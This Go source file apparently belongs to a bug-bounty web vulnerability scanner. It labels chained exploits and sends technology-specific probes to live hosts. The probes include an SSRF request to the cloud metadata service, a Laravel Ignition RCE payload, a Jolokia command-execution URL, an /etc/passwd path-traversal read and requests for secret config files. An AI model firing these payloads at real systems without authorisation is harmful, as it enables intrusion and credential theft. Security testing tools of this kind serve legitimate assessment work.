package scanner

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// ==========================================================================
// NUCLEAR TIER: What makes the difference between $0 and $50K
// ==========================================================================

// --- Chained Exploit Engine ---
// Automatically chains findings into higher-impact exploits

type ExploitChainResult struct {
	Chain    []Finding
	Impact   string
	Severity string
}

func RunExploitChains(cfg *engine.Config, http *engine.HTTPClient, findings []Finding) []Finding {
	var chained []Finding

	redirects := filterByType(findings, "Open Redirect")
	cors := filterByType(findings, "CORS")
	xss := filterByType(findings, "XSS")
	ssrf := filterByType(findings, "SSRF")
	sqli := filterByType(findings, "SQL")
	idor := filterByType(findings, "IDOR")
	takeovers := filterByType(findings, "Subdomain Takeover")
	lfi := filterByType(findings, "LFI")
	ssti := filterByType(findings, "SSTI")
	cmdi := filterByType(findings, "Command")

	// Chain 1: Open Redirect → OAuth Token Theft
	for _, r := range redirects {
		if oauthURL := findOAuthEndpoint(http, r.URL); oauthURL != "" {
			chained = append(chained, Finding{
				Type: "Exploit Chain: Open Redirect → OAuth Token Theft", Severity: "critical",
				URL: oauthURL, Payload: r.Payload,
				Detail:   fmt.Sprintf("Redirect at %s steals OAuth tokens via redirect_uri", r.URL),
				Template: "apex-chain-oauth",
			})
		}
	}

	// Chain 2: XSS + CORS → Account Takeover
	if len(cors) > 0 && len(xss) > 0 {
		chained = append(chained, Finding{
			Type: "Exploit Chain: XSS + CORS → Account Takeover", Severity: "critical",
			URL:      xss[0].URL,
			Detail:   fmt.Sprintf("XSS at %s + CORS at %s = steal any user's session", xss[0].URL, cors[0].URL),
			Template: "apex-chain-ato",
		})
	}

	// Chain 3: SSRF → Cloud Creds → Infrastructure Takeover
	for _, s := range ssrf {
		if strings.Contains(s.Evidence, "AccessKeyId") || strings.Contains(s.Evidence, "ami-id") {
			chained = append(chained, Finding{
				Type: "Exploit Chain: SSRF → AWS Credentials → Full Infrastructure", Severity: "critical",
				URL: s.URL, Evidence: s.Evidence,
				Detail:   "SSRF leaks IAM credentials → S3/EC2/Lambda access",
				Template: "apex-chain-cloud",
			})
		}
	}

	// Chain 4: Subdomain Takeover → Cookie Theft
	for _, t := range takeovers {
		chained = append(chained, Finding{
			Type: "Exploit Chain: Subdomain Takeover → Session Hijacking", Severity: "critical",
			URL: t.URL, Detail: "Dangling subdomain → steal parent domain cookies",
			Template: "apex-chain-cookie",
		})
	}

	// Chain 5: SQLi → Data Dump → Account Takeover
	for _, s := range sqli {
		if strings.Contains(s.Evidence, "version") || strings.Contains(s.Detail, "99%") || strings.Contains(s.Detail, "98%") {
			chained = append(chained, Finding{
				Type: "Exploit Chain: SQLi → Database Dump → Mass Account Takeover", Severity: "critical",
				URL: s.URL, Param: s.Param,
				Detail:   "Confirmed SQLi can extract user credentials, tokens, PII from database",
				Template: "apex-chain-sqli-ato",
			})
			break
		}
	}

	// Chain 6: IDOR + PII = Privacy Violation (GDPR critical)
	for _, i := range idor {
		if strings.Contains(i.Evidence, "email") || strings.Contains(i.Evidence, "phone") || strings.Contains(i.Evidence, "address") {
			chained = append(chained, Finding{
				Type: "Exploit Chain: IDOR → Mass PII Exposure (GDPR)", Severity: "critical",
				URL: i.URL, Evidence: i.Evidence,
				Detail:   "IDOR exposes PII of other users → enumerate all accounts",
				Template: "apex-chain-idor-pii",
			})
		}
	}

	// Chain 7: LFI → Source Code → Hardcoded Secrets → RCE
	for _, l := range lfi {
		if strings.Contains(l.Evidence, "root:") || strings.Contains(l.Detail, "passwd") {
			chained = append(chained, Finding{
				Type: "Exploit Chain: LFI → Source Code Read → Secret Extraction", Severity: "critical",
				URL: l.URL, Param: l.Param,
				Detail:   "LFI reads system files → extract app source/config → find DB creds/API keys",
				Template: "apex-chain-lfi-rce",
			})
			break
		}
	}

	// Chain 8: SSTI → RCE
	for _, s := range ssti {
		chained = append(chained, Finding{
			Type: "Exploit Chain: SSTI → Remote Code Execution", Severity: "critical",
			URL: s.URL, Param: s.Param,
			Detail:   fmt.Sprintf("Template injection → OS command execution. %s", s.Evidence),
			Template: "apex-chain-ssti-rce",
		})
	}

	// Chain 9: XSS + Password Reset → Account Takeover (no CORS needed)
	if len(xss) > 0 {
		for _, x := range xss {
			parsed, _ := url.Parse(x.URL)
			if parsed == nil {
				continue
			}
			resetURL := parsed.Scheme + "://" + parsed.Host + "/password/reset"
			resp := http.Get(resetURL)
			if resp.Err == nil && resp.StatusCode != 404 {
				chained = append(chained, Finding{
					Type: "Exploit Chain: XSS → Password Reset Token Theft → ATO", Severity: "critical",
					URL:      x.URL,
					Detail:   fmt.Sprintf("XSS can steal password reset tokens from %s", resetURL),
					Template: "apex-chain-xss-reset",
				})
				break
			}
		}
	}

	// Chain 10: CMDi → Reverse Shell → Full Server Compromise
	for _, c := range cmdi {
		if strings.Contains(c.Detail, "98%") || strings.Contains(c.Detail, "99%") || strings.Contains(c.Detail, "confirmed") {
			chained = append(chained, Finding{
				Type: "Exploit Chain: Command Injection → Reverse Shell → Server Takeover", Severity: "critical",
				URL: c.URL, Param: c.Param,
				Detail:   "Confirmed OS command execution → full server compromise possible",
				Template: "apex-chain-cmdi-rce",
			})
			break
		}
	}

	// Chain 11: Open Redirect + XSS → Phishing with trusted domain
	if len(redirects) > 0 && len(xss) > 0 {
		chained = append(chained, Finding{
			Type: "Exploit Chain: Open Redirect + XSS → Trusted Domain Phishing", Severity: "high",
			URL:      redirects[0].URL,
			Detail:   fmt.Sprintf("Redirect from trusted domain → XSS page at %s → credential theft", xss[0].URL),
			Template: "apex-chain-phish",
		})
	}

	return chained
}

func findOAuthEndpoint(http *engine.HTTPClient, redirectURL string) string {
	parsed, _ := url.Parse(redirectURL)
	if parsed == nil {
		return ""
	}
	base := parsed.Scheme + "://" + parsed.Host
	oauthPaths := []string{"/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
		"/connect/authorize", "/oauth/token", "/.well-known/openid-configuration"}
	for _, p := range oauthPaths {
		resp := http.Get(base + p)
		if resp.Err == nil && resp.StatusCode != 404 {
			return base + p
		}
	}
	return ""
}

func filterByType(findings []Finding, typeSubstr string) []Finding {
	var result []Finding
	for _, f := range findings {
		if strings.Contains(f.Type, typeSubstr) {
			result = append(result, f)
		}
	}
	return result
}

// --- Technology Fingerprint → Targeted Payloads ---

type TechProfile struct {
	Name     string
	Payloads []TechPayload
}

type TechPayload struct {
	Path   string
	Method string
	Body   string
	Detect string
	Type   string
	Sev    string
}

var techProfiles = []TechProfile{
	{
		Name: "Next.js",
		Payloads: []TechPayload{
			{"/_next/data/BUILD_ID/index.json", "GET", "", "pageProps", "Next.js Data Leak", "medium"},
			{"/api/__nextjs_original-stack-frame", "GET", "", "stack", "Next.js Debug Endpoint", "high"},
			{"/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75", "GET", "", "ami-id", "Next.js Image SSRF", "critical"},
		},
	},
	{
		Name: "Laravel",
		Payloads: []TechPayload{
			{"/.env", "GET", "", "APP_KEY", "Laravel .env Exposed", "critical"},
			{"/telescope", "GET", "", "telescope", "Laravel Telescope Debug", "high"},
			{"/_ignition/execute-solution", "POST", `{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":""}}`, "solution", "Laravel Ignition RCE", "critical"},
			{"/storage/logs/laravel.log", "GET", "", "stack trace", "Laravel Log Exposed", "high"},
		},
	},
	{
		Name: "Spring",
		Payloads: []TechPayload{
			{"/actuator/env", "GET", "", "propertySources", "Spring Actuator Env Dump", "critical"},
			{"/actuator/heapdump", "GET", "", "", "Spring Heapdump (Memory Leak)", "critical"},
			{"/actuator/gateway/routes", "GET", "", "route_id", "Spring Cloud Gateway Routes", "high"},
			{"/jolokia/exec/java.lang:type=Runtime/exec/whoami", "GET", "", "", "Spring Jolokia RCE", "critical"},
		},
	},
	{
		Name: "WordPress",
		Payloads: []TechPayload{
			{"/wp-json/wp/v2/users", "GET", "", "slug", "WordPress User Enumeration", "medium"},
			{"/wp-content/debug.log", "GET", "", "PHP", "WordPress Debug Log", "high"},
			{"/wp-config.php.bak", "GET", "", "DB_PASSWORD", "WordPress Config Backup", "critical"},
			{"/xmlrpc.php", "POST", `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`, "methodResponse", "WordPress XMLRPC Enabled", "medium"},
		},
	},
	{
		Name: "Node.js/Express",
		Payloads: []TechPayload{
			{"/graphql?query={__schema{types{name}}}", "GET", "", "__schema", "GraphQL Introspection", "medium"},
			{"/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "GET", "", "root:", "Express Path Traversal", "critical"},
			{"/", "GET", "", "", "Express Error Stack Trace", "medium"}, // checked via error trigger
		},
	},
	{
		Name: "Django",
		Payloads: []TechPayload{
			{"/admin/", "GET", "", "Django administration", "Django Admin Exposed", "high"},
			{"/%00/", "GET", "", "Traceback", "Django Debug Mode", "high"},
			{"/api/swagger/", "GET", "", "swagger", "Django API Docs Exposed", "medium"},
		},
	},
	{
		Name: "ASP.NET",
		Payloads: []TechPayload{
			{"/elmah.axd", "GET", "", "Error Log", "ASP.NET ELMAH Error Log", "high"},
			{"/trace.axd", "GET", "", "Request Details", "ASP.NET Trace Enabled", "high"},
			{"/web.config", "GET", "", "connectionString", "ASP.NET Config Exposed", "critical"},
		},
	},
}

func scanTechTargeted(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	if len(crawl.Pages) == 0 {
		return findings
	}

	// Detect technologies from first few pages
	detectedTechs := detectTechnologies(http, crawl.Pages[:min(5, len(crawl.Pages))])

	// Get unique base URLs
	bases := make(map[string]bool)
	for _, page := range crawl.Pages[:min(30, len(crawl.Pages))] {
		parsed, _ := url.Parse(page.URL)
		if parsed != nil {
			bases[parsed.Scheme+"://"+parsed.Host] = true
		}
	}

	for _, tech := range techProfiles {
		if !detectedTechs[tech.Name] {
			continue
		}
		for base := range bases {
			for _, payload := range tech.Payloads {
				wg.Add(1)
				go func(b string, p TechPayload, techName string) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					testURL := b + p.Path
					var resp *engine.Response
					if p.Method == "POST" && p.Body != "" {
						resp = http.Post(testURL, "application/json", p.Body)
					} else {
						resp = http.Get(testURL)
					}

					if resp.Err != nil || resp.StatusCode == 404 || resp.StatusCode == 403 {
						return
					}

					if p.Detect != "" && strings.Contains(strings.ToLower(resp.Body), strings.ToLower(p.Detect)) {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     p.Type + " (" + techName + ")",
							Severity: p.Sev,
							URL:      testURL,
							Detail:   fmt.Sprintf("Technology-specific vulnerability in %s application", techName),
							Template: "apex-tech-" + strings.ToLower(techName),
						})
						mu.Unlock()
					}
				}(base, payload, tech.Name)
			}
		}
	}
	wg.Wait()
	return findings
}

func detectTechnologies(http *engine.HTTPClient, pages []crawler.Page) map[string]bool {
	techs := make(map[string]bool)
	for _, page := range pages {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		body := strings.ToLower(resp.Body)
		headers := strings.ToLower(fmt.Sprintf("%v", resp.Headers))

		if strings.Contains(body, "_next/") || strings.Contains(body, "__next") {
			techs["Next.js"] = true
		}
		if strings.Contains(headers, "x-powered-by: express") || strings.Contains(body, "express") {
			techs["Node.js/Express"] = true
		}
		if strings.Contains(headers, "laravel") || strings.Contains(body, "laravel") {
			techs["Laravel"] = true
		}
		if strings.Contains(headers, "x-powered-by: asp.net") || strings.Contains(headers, "x-aspnet") {
			techs["ASP.NET"] = true
		}
		if strings.Contains(body, "wp-content") || strings.Contains(body, "wordpress") {
			techs["WordPress"] = true
		}
		if strings.Contains(headers, "x-powered-by: django") || strings.Contains(body, "csrfmiddlewaretoken") {
			techs["Django"] = true
		}
		if strings.Contains(headers, "spring") || strings.Contains(headers, "x-application-context") {
			techs["Spring"] = true
		}
	}
	return techs
}

// --- Intelligent Parameter Discovery ---
// Discovers hidden API endpoints from JS files

var apiPatternRe = regexp.MustCompile(`(?:"|'|` + "`" + `)(/api/[a-zA-Z0-9/_\-]+)(?:"|'|` + "`" + `)`)
var fetchPatternRe = regexp.MustCompile(`(?:fetch|axios\.\w+|\.(?:get|post|put|delete|patch))\s*\(\s*(?:"|'|` + "`" + `)([^"'` + "`" + `\s]+)`)

func discoverAPIsFromJS(http *engine.HTTPClient, crawl *crawler.Result) []string {
	discovered := make(map[string]bool)

	for _, page := range crawl.Pages {
		if !strings.HasSuffix(page.URL, ".js") {
			continue
		}
		resp := http.Get(page.URL)
		if resp.Err != nil || resp.StatusCode != 200 {
			continue
		}

		for _, re := range []*regexp.Regexp{apiPatternRe, fetchPatternRe} {
			matches := re.FindAllStringSubmatch(resp.Body, 50)
			for _, m := range matches {
				if len(m) >= 2 {
					path := m[1]
					if strings.HasPrefix(path, "/") && len(path) > 3 && len(path) < 100 {
						discovered[path] = true
					}
				}
			}
		}
	}

	var paths []string
	for p := range discovered {
		paths = append(paths, p)
	}
	return paths
}

// --- Response Anomaly Detection ---
// Detects unusual responses that indicate bugs

func scanResponseAnomalies(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Discover API paths from JS
	apiPaths := discoverAPIsFromJS(http, crawl)

	if len(crawl.Pages) == 0 {
		return findings
	}

	// Get base URLs
	bases := make(map[string]bool)
	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		parsed, _ := url.Parse(page.URL)
		if parsed != nil {
			bases[parsed.Scheme+"://"+parsed.Host] = true
		}
	}

	for base := range bases {
		for _, path := range apiPaths {
			wg.Add(1)
			go func(b, p string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				testURL := b + p
				resp := http.Get(testURL)
				if resp.Err != nil || resp.StatusCode == 404 {
					return
				}

				// Check for verbose error messages
				if resp.StatusCode >= 400 && resp.StatusCode < 500 {
					bodyLower := strings.ToLower(resp.Body)
					if strings.Contains(bodyLower, "stack") || strings.Contains(bodyLower, "traceback") ||
						strings.Contains(bodyLower, "exception") || strings.Contains(bodyLower, "at line") {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "API Error Information Leak",
							Severity: "medium",
							URL:      testURL,
							Detail:   fmt.Sprintf("API endpoint returns verbose error (status %d) with stack trace/debug info", resp.StatusCode),
							Template: "apex-api-error-leak",
						})
						mu.Unlock()
					}
				}

				// Check for unauthenticated API access
				if resp.StatusCode == 200 {
					var jsonData interface{}
					if json.Unmarshal([]byte(resp.Body), &jsonData) == nil && len(resp.Body) > 50 {
						// It's valid JSON with data — potential unauth access
						if strings.Contains(p, "user") || strings.Contains(p, "account") ||
							strings.Contains(p, "admin") || strings.Contains(p, "internal") ||
							strings.Contains(p, "private") || strings.Contains(p, "config") {
							mu.Lock()
							findings = append(findings, Finding{
								Type:     "Unauthenticated API Access",
								Severity: "high",
								URL:      testURL,
								Detail:   fmt.Sprintf("Sensitive API endpoint accessible without auth (%d bytes JSON response)", len(resp.Body)),
								Template: "apex-unauth-api",
							})
							mu.Unlock()
						}
					}
				}
			}(base, path)
		}
	}
	wg.Wait()
	return findings
}
